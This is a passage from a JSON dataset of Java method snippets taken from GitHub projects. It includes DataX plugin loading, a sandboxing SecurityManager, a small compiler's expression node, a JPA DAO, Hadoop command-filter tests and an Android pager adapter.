pluginName));\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/LoadUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31751, "method_name": "loadPluginClass", "class_name": "LoadUtil", "params": ["PluginType", "String", "ContainerType"], "throws": null, "modifiers": ["private", "synchronized", "static"], "return_type": "Class<AbstractPlugin>", "snippet": "    private static synchronized Class<? extends AbstractPlugin> loadPluginClass(\n            PluginType pluginType, String pluginName,\n            ContainerType pluginRunType) {\n        Configuration pluginConf = getPluginConf(pluginType, pluginName);\n        JarLoader jarLoader = LoadUtil.getJarLoader(pluginType, pluginName);\n        try {\n            return (Class<? extends AbstractPlugin>) jarLoader\n                    .loadClass(pluginConf.getString(\"class\") + \"$\"\n                            + pluginRunType.value());\n        } catch (Exception e) {\n            throw DataXException.asDataXException(FrameworkErrorCode.RUNTIME_ERROR, e);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/LoadUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31752, "method_name": "getJarLoader", "class_name": "LoadUtil", "params": ["PluginType", "String"], "throws": null, "modifiers": ["public", "static", "synchronized"], "return_type": "JarLoader", "snippet": "    public static synchronized JarLoader getJarLoader(PluginType pluginType,\n                                                      String pluginName) {\n        Configuration pluginConf = getPluginConf(pluginType, pluginName);\n\n        JarLoader jarLoader = jarLoaderCenter.get(generatePluginKey(pluginType,\n                pluginName));\n        if (null == jarLoader) {\n            String pluginPath = pluginConf.getString(\"path\");\n            if (StringUtils.isBlank(pluginPath)) {\n                throw DataXException.asDataXException(\n                        FrameworkErrorCode.RUNTIME_ERROR,\n                        String.format(\n                                \"%s\u63d2\u4ef6[%s]\u8def\u5f84\u975e\u6cd5!\",\n                                pluginType, pluginName));\n            }\n            jarLoader = new JarLoader(new String[]{pluginPath});\n            jarLoaderCenter.put(generatePluginKey(pluginType, pluginName),\n                    jarLoader);\n        }\n\n        return jarLoader;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/LoadUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31753, "method_name": "checkRead", "class_name": "ProcessorSecurityManager", "params": ["FileDescriptor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void checkRead(FileDescriptor fd) {\n        checkIfStdDescriptor(fd);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/processor/ProcessorSecurityManager.java", "stars": "23", "class_props": {"extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"id": 31754, "method_name": "checkWrite", "class_name": "ProcessorSecurityManager", "params": ["FileDescriptor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void checkWrite(FileDescriptor fd) {\n        checkIfStdDescriptor(fd);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/processor/ProcessorSecurityManager.java", "stars": "23", "class_props": {"extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"id": 31755, "method_name": "checkPermission", "class_name": "ProcessorSecurityManager", "params": ["Permission"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void checkPermission(Permission perm) {\n        if(perm instanceof AWTPermission){\n            throw new AccessControlException(\"have no permission to load AWT\");\n        }else if(perm instanceof FilePermission){\n            FilePermission permission = (FilePermission)perm;\n            if(SecurityConstants.FILE_EXECUTE_ACTION.equals(permission.getActions())){\n                throw new AccessControlException(\"have no permission to execute command\");\n            }\n            checkFilePermission(permission.getName());\n        }else if(perm instanceof SocketPermission){\n            checkSocket((SocketPermission)perm);\n        }else if(perm instanceof PropertyPermission){\n            checkProps((PropertyPermission)perm);\n        }else if(perm instanceof RuntimePermission){\n            checkRuntime((RuntimePermission)perm);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/processor/ProcessorSecurityManager.java", "stars": "23", "class_props": {"extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"id": 31756, "method_name": "checkFilePermission", "class_name": "ProcessorSecurityManager", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void checkFilePermission(String file){\n        if(!new File(file).getAbsolutePath().startsWith(workDir)){\n            throw new AccessControlException(\"have no permission to : \" + file);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/processor/ProcessorSecurityManager.java", "stars": "23", "class_props": {"extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"id": 31757, "method_name": "checkIfStdDescriptor", "class_name": "ProcessorSecurityManager", "params": ["FileDescriptor"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void checkIfStdDescriptor(FileDescriptor fd){\n        if(!fd.equals(FileDescriptor.out) && !fd.equals(FileDescriptor.in)\n                && !fd.equals(FileDescriptor.err)) {\n            throw new AccessControlException(\"have no permission to read fd : \" + fd.toString());\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/processor/ProcessorSecurityManager.java", "stars": "23", "class_props": {"extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"id": 31758, "method_name": "checkSocket", "class_name": "ProcessorSecurityManager", "params": ["SocketPermission"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void checkSocket(SocketPermission perm){\n        if(!this.switchMap.getOrDefault(CAN_BUILD_SOCK, false)){\n            throw new AccessControlException(\"have no permission to build a socket\");\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/processor/ProcessorSecurityManager.java", "stars": "23", "class_props": {"extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"id": 31759, "method_name": "checkProps", "class_name": "ProcessorSecurityManager", "params": ["PropertyPermission"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void checkProps(PropertyPermission perm){\n        if(perm.getActions().equals(SecurityConstants.PROPERTY_READ_ACTION)\n                && !this.switchMap.getOrDefault(CAN_READ_PROPERTIES, true)){\n            throw new AccessControlException(\"have no permission to read property\");\n        }\n        if(perm.getActions().equals(SecurityConstants.PROPERTY_RW_ACTION)\n                && !this.switchMap.getOrDefault(CAN_RW_PROPERTIES, false)){\n            throw new AccessControlException(\"have no permission to read/write property\");\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/processor/ProcessorSecurityManager.java", "stars": "23", "class_props": {"extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"id": 31760, "method_name": "checkRuntime", "class_name": "ProcessorSecurityManager", "params": ["RuntimePermission"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void checkRuntime(RuntimePermission perm){\n        if(perm.getName().startsWith(EXIT_JVM)){\n            throw new AccessControlException(\"have no permission to exit jvm\");\n        }\n        if(perm.getName().equals(QUEUE_PRINT_JOB)){\n            throw new AccessControlException(\"have no permission to queue print job\");\n        }\n        if(perm.getName().equals(MODIFY_THREAD_GROUP_PERMISSION) || perm.getName().equals(MODIFY_THREAD_PERMISSION)){\n            throw new AccessControlException(\"have no permission to modify thread/threadGroup\");\n        }\n        if(perm.getName().equals(SET_SECURITY_MANAGER) &&\n                !this.switchMap.getOrDefault(CAN_SET_SECURITY_MANAGER, false)){\n            throw new AccessControlException(\"have no permission to set SecurityManager\");\n        }\n\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/processor/ProcessorSecurityManager.java", "stars": "23", "class_props": {"extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"id": 31761, "method_name": "setCanSetSecurityManager", "class_name": "ProcessorSecurityManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCanSetSecurityManager(boolean isCan){\n        this.switchMap.put(CAN_SET_SECURITY_MANAGER, isCan);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/processor/ProcessorSecurityManager.java", "stars": "23", "class_props": {"extends": "SecurityManager", "implements": null, "modifiers": ["public"]}}, {"id": 31762, "method_name": "checkType", "class_name": "ExprNE", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\n\t\tthis.getLeft().checkType();\n\t\tthis.getRight().checkType();\n\t\tTypeCode[] typeCodes = {TypeCode.INTEGER, TypeCode.FLOAT, TypeCode.STRING, TypeCode.BOOLEAN};\n\t\tgetLeft().getType().assertType(this, typeCodes);\n\t\tgetLeft().getType().assertType(this, getRight().getType());\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprNE.java", "stars": "3", "class_props": {"extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"id": 31763, "method_name": "generateCode", "class_name": "ExprNE", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\n\t\tString result;\n\t\tresult = \"(\" + getLeft().generateCode()\n\t\t\t\t+ \" != \" + getRight().generateCode() + \")\";\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprNE.java", "stars": "3", "class_props": {"extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"id": 31764, "method_name": "constEval", "class_name": "ExprNE", "params": ["Environment<ExprVALUE>"], "throws": ["EnvironmentException", "TypeException"], "modifiers": ["public"], "return_type": "Object", "snippet": "\tpublic Object constEval(Environment<ExprVALUE> environment) throws EnvironmentException, TypeException {\n\t\tObject o1 = getLeft().constEval(environment);\n\t\tObject o2 = getRight().constEval(environment);\n\t\tif ((o1 instanceof Integer) && (o2 instanceof Integer)) \n\t\t\treturn new Boolean((Integer)o1 != (Integer)o2);\n\t\telse if ((o1 instanceof Float) && (o2 instanceof Float)) \n\t\t\treturn new Boolean((Float)o1 != (Float)o2);\n\t\telse if ((o1 instanceof String) && (o2 instanceof String)) \n\t\t\treturn new Boolean(!((String)o1).equals(o2));\n\t\telse if ((o1 instanceof Boolean) && (o2 instanceof Boolean)) \n\t\t\treturn new Boolean((Float)o1 != (Float)o2);\n\t\telse\n\t\t\tthrow new TypeException(\"Impossible de calculer la constante, erreur de type\", line, column);\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprNE.java", "stars": "3", "class_props": {"extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"id": 31765, "method_name": "toString", "class_name": "ExprNE", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn \"(\" + this.getLeft() + \" != \" + this.getRight() + \")\";\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprNE.java", "stars": "3", "class_props": {"extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"id": 31766, "method_name": "salvar", "class_name": "CategoriaDao", "params": ["Categoria"], "throws": null, "modifiers": ["public"], "return_type": "Categoria", "snippet": "\tpublic Categoria salvar(Categoria categoria) {\n\t\tEntityManager em = JPAUtil.getEntityManager();\n\t\tEntityTransaction trx = em.getTransaction();\n\n\t\ttrx.begin();\n\t\tcategoria = em.merge(categoria);\n\t\ttrx.commit();\n\t\tem.close();\n\n\t\treturn categoria;\n\n\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/dao/CategoriaDao.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31767, "method_name": "buscarTodos", "class_name": "CategoriaDao", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Categoria>", "snippet": "\tpublic List<Categoria> buscarTodos() {\n\t\tEntityManager em = JPAUtil.getEntityManager();\n\t\tTypedQuery<Categoria> query = em.createQuery(\"from Categoria\", Categoria.class);\n\n\t\ttry {\n\t\t\treturn query.getResultList();\n\n\t\t} finally {\n\t\t\tem.close();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/dao/CategoriaDao.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31768, "method_name": "excluir", "class_name": "CategoriaDao", "params": ["Categoria"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void excluir(Categoria categoria) {\n\t\tEntityManager em = JPAUtil.getEntityManager();\n\t\tEntityTransaction trx = em.getTransaction();\n\n\t\ttrx.begin();\n\n\t\tem.remove(em.find(Categoria.class, categoria.getId()));\n\n\t\ttrx.commit();\n\n\t\tem.close();\n\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/dao/CategoriaDao.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31769, "method_name": "buscarPorId", "class_name": "CategoriaDao", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "Categoria", "snippet": "\tpublic Categoria buscarPorId(Long id) {\n\t\tEntityManager em = JPAUtil.getEntityManager();\n\n\t\ttry {\n\t\t\treturn em.find(Categoria.class, id);\n\n\t\t} finally {\n\t\t\tem.close();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/dao/CategoriaDao.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31770, "method_name": "pesquisarPorNome", "class_name": "CategoriaDao", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<Categoria>", "snippet": "\tpublic List<Categoria> pesquisarPorNome(String nome) {\n\tEntityManager em = JPAUtil.getEntityManager();\n    String consulta = \"select descricao from Categoria where descricao = :descricao\";\n    TypedQuery<Categoria> query = em.createQuery(consulta, Categoria.class);\n    query.setParameter(\"descricao\", \"%\" + nome + \"%\");\n  \n    if(!query.getResultList().isEmpty()) {\n    \treturn query.getResultList();\n\t}else {\n\t\treturn buscarTodos();\n\t}\n}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/dao/CategoriaDao.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31771, "method_name": "beforeMethod", "class_name": "TestHadoopJobUtilsFilterCommands", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void beforeMethod() throws IOException {\n    originalCommands = new LinkedList<String>();\n    originalCommands.add(\"kinit blah@blah\");\n    originalCommands.add(\"hadoop fs -ls\");\n    originalCommands.add(\"hadoop fs -mkdir\");\n    originalCommands.add(\"kdestroy\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsFilterCommands.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31772, "method_name": "testEmptyInputList", "class_name": "TestHadoopJobUtilsFilterCommands", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testEmptyInputList() {\n    List<String> filteredCommands = HadoopJobUtils.filterCommands(Collections.<String> emptyList(),\n            HadoopJobUtils.MATCH_ALL_REGEX, HadoopJobUtils.MATCH_NONE_REGEX, logger);\n    Assert.assertTrue(\"filtering output of an empty collection should be empty collection\",\n            filteredCommands.isEmpty());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsFilterCommands.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31773, "method_name": "testNoCommandMatchCriteria", "class_name": "TestHadoopJobUtilsFilterCommands", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testNoCommandMatchCriteria() {\n    List<String> filteredCommands = HadoopJobUtils.filterCommands(originalCommands, \"hadoop.*\",\n            \"hadoop.*\", logger);\n    Assert.assertTrue(\"filtering output of with no matching command should be empty collection\",\n            filteredCommands.isEmpty());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsFilterCommands.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31774, "method_name": "testWhitelistCriteria", "class_name": "TestHadoopJobUtilsFilterCommands", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testWhitelistCriteria() {\n    List<String> filteredCommands = HadoopJobUtils.filterCommands(originalCommands, \"hadoop.*\",\n            HadoopJobUtils.MATCH_NONE_REGEX, logger);\n    Assert.assertEquals(filteredCommands.get(0), \"hadoop fs -ls\");\n    Assert.assertEquals(filteredCommands.get(1), \"hadoop fs -mkdir\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsFilterCommands.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31775, "method_name": "testBlackListCriteria", "class_name": "TestHadoopJobUtilsFilterCommands", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testBlackListCriteria() {\n    List<String> filteredCommands = HadoopJobUtils.filterCommands(originalCommands,\n            HadoopJobUtils.MATCH_ALL_REGEX, \".*kinit.*\", logger);\n    Assert.assertEquals(filteredCommands.get(0), \"hadoop fs -ls\");\n    Assert.assertEquals(filteredCommands.get(1), \"hadoop fs -mkdir\");\n    Assert.assertEquals(filteredCommands.get(2), \"kdestroy\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsFilterCommands.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31776, "method_name": "testMultipleCriterias", "class_name": "TestHadoopJobUtilsFilterCommands", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testMultipleCriterias() {\n    List<String> filteredCommands = HadoopJobUtils.filterCommands(originalCommands, \"hadoop.*\",\n            \".*kinit.*\", logger);\n    Assert.assertEquals(filteredCommands.get(0), \"hadoop fs -ls\");\n    Assert.assertEquals(filteredCommands.get(1), \"hadoop fs -mkdir\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsFilterCommands.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31777, "method_name": "setNonNullParameter", "class_name": "SqlTimeTypeHandler", "params": ["PreparedStatement", "int", "Time", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, Time parameter, JdbcType jdbcType)\n      throws SQLException {\n    ps.setTime(i, parameter);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/SqlTimeTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 31778, "method_name": "getNullableResult", "class_name": "SqlTimeTypeHandler", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Time", "snippet": "  public Time getNullableResult(ResultSet rs, String columnName)\n      throws SQLException {\n    return rs.getTime(columnName);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/SqlTimeTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 31779, "method_name": "getNullableResult", "class_name": "SqlTimeTypeHandler", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Time", "snippet": "  public Time getNullableResult(ResultSet rs, int columnIndex)\n      throws SQLException {\n    return rs.getTime(columnIndex);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/SqlTimeTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 31780, "method_name": "getNullableResult", "class_name": "SqlTimeTypeHandler", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Time", "snippet": "  public Time getNullableResult(CallableStatement cs, int columnIndex)\n      throws SQLException {\n    return cs.getTime(columnIndex);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/SqlTimeTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 31781, "method_name": "getCount", "class_name": "GracePagerAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCount() {\n        return mItems.size();\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GracePagerAdapter.java", "stars": "331", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31782, "method_name": "isViewFromObject", "class_name": "GracePagerAdapter", "params": ["View", "Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isViewFromObject(@NonNull View view, @NonNull Object object) {\n        ViewItemHolder viewItemHolder = (ViewItemHolder) object;\n        return viewItemHolder.mItemView == view;\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GracePagerAdapter.java", "stars": "331", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31783, "method_name": "instantiateItem", "class_name": "GracePagerAdapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object instantiateItem(@NonNull ViewGroup container, int position) {\n        GraceLog.d(\"instantiateItem() called with: position = [\" + position + \"]\");\n        Item item = mItems.get(position);\n        View itemView = instantiateItemView(container, item, position);\n        bindItemView(itemView, item, position, true);\n        container.addView(itemView);\n        ViewItemHolder viewItemHolder = new ViewItemHolder(item, itemView, position);\n        mViewItemHolders.add(viewItemHolder);\n        return viewItemHolder;\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GracePagerAdapter.java", "stars": "331", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31784, "method_name": "destroyItem", "class_name": "GracePagerAdapter", "params": ["ViewGroup", "int", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void destroyItem(@NonNull ViewGroup container, int position, @NonNull Object object) {\n        GraceLog.d(\"destroyItem() called with: position = [\" + position + \"]\");\n        ViewItemHolder viewItemHolder = (ViewItemHolder) object;\n        container.removeView(viewItemHolder.mItemView);\n        mViewItemHolders.remove(viewItemHolder);\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GracePagerAdapter.java", "stars": "331", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31785, "method_name": "getItemPosition", "class_name": "GracePagerAdapter", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemPosition(@NonNull Object object) {\n        ViewItemHolder viewItemHolder = (ViewItemHolder) object;\n        Item item = viewItemHolder.mItem;\n        // \u5224\u65ad\u5f53\u524d\u5185\u5b58\u4e2d\u9875\u9762\u6570\u636e\u662f\u5426\u8fd8\u5b58\u5728\u4e8e\u5237\u65b0\u540e\u7684\u6570\u636e\u96c6\u5408\u4e2d\uff0c\u4e0d\u5b58\u5728\u8fd4\u56dePOSITION_NONE\u8fdb\u884c\u79fb\u9664\n        int newPos = mItems.indexOf(item);\n        int itemPosition = newPos == -1 ? POSITION_NONE : newPos;\n        int oldPos = viewItemHolder.mPosition;\n        GraceLog.d(\"getItemPosition: oldPos=\" + oldPos + \",newPos=\" + newPos);\n        if (itemPosition >= 0) {\n            // \u6570\u636e\u7d22\u5f15\u53d1\u751f\u6539\u53d8\n            if (oldPos != itemPosition) {\n                // \u66f4\u65b0\u7d22\u5f15\u4f4d\u7f6e\n                viewItemHolder.mPosition = itemPosition;\n            }\n            // \u5f53\u524d\u9875\u9762\u91cd\u65b0\u7ed1\u5b9a\u6570\u636e\uff0c\u4ee5\u4fbf\u4e8e\u5237\u65b0\u89c6\u56fe\u5185\u5bb9\n            bindItemView(viewItemHolder.mItemView, item, itemPosition, false);\n        }\n        return itemPosition;\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GracePagerAdapter.java", "stars": "331", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31786, "method_name": "notifyDataSetChanged", "class_name": "GracePagerAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void notifyDataSetChanged() {\n        mDataSetChanging = true;\n        super.notifyDataSetChanged();\n        mDataSetChanging = false;\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GracePagerAdapter.java", "stars": "331", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31787, "method_name": "instantiateItemView", "class_name": "GracePagerAdapter", "params": ["ViewGroup", "Item", "int"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "View", "snippet": "    protected abstract View instantiateItemView(@NonNull ViewGroup container, Item item, int position);\n\n    /**\n     * \u7ed9ItemView\u7ed1\u5b9a\u6570\u636e\uff08\u521b\u5efa\u89c6\u56fe\u4ee5\u53ca\u6570\u636e\u5237\u65b0\u65f6\u90fd\u4f1a\u8c03\u7528\uff09\n     *\n     * @param itemView \u89c6\u56fe\n     * @param item     \u6570\u636e\n     * @param position \u7d22\u5f15\n     * @param first    \u662f\u5426\u4e3a\u9996\u6b21\u7ed1\u5b9a\u8c03\u7528\uff0c\u89c6\u56fe\u521b\u5efa\u540e\u9996\u6b21\u7ed1\u5b9a\u8be5\u503c\u4e3atrue\uff1b\u6570\u636e\u5237\u65b0\u65f6\u8c03\u7528\u4e3afalse\n     */\n    protected abstract void bindItemView(@NonNull View itemView, Item item, int position, boolean first);\n\n    /**\n     * \u83b7\u53d6\u9875\u9762\u89c6\u56fe\u5bf9\u5e94\u7684\u6570\u636e\u7d22\u5f15\n     *\n     * @param page \u9875\u9762\u89c6\u56fe\n     * @return \u672a\u627e\u5230\u8fd4\u56de-1\n     */\n    public int getPageViewPosition(View page) {\n        for (ViewItemHolder viewItemHolder : mViewItemHolders) {\n            if (viewItemHolder.mItemView == page) {\n                return viewItemHolder.mPosition;\n            }\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GracePagerAdapter.java", "stars": "331", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31788, "method_name": "bindItemView", "class_name": "GracePagerAdapter", "params": ["View", "Item", "int", "boolean"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void bindItemView(@NonNull View itemView, Item item, int position, boolean first);\n\n    /**\n     * \u83b7\u53d6\u9875\u9762\u89c6\u56fe\u5bf9\u5e94\u7684\u6570\u636e\u7d22\u5f15\n     *\n     * @param page \u9875\u9762\u89c6\u56fe\n     * @return \u672a\u627e\u5230\u8fd4\u56de-1\n     */\n    public int getPageViewPosition(View page) {\n        for (ViewItemHolder viewItemHolder : mViewItemHolders) {\n            if (viewItemHolder.mItemView == page) {\n                return viewItemHolder.mPosition;\n            }\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GracePagerAdapter.java", "stars": "331", "class_props": {"extends": "PagerAdapter", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31789, "method_name": "getPageViewPosition", "class_name": "GracePagerAdapter", "params": ["View"], "throws": null, 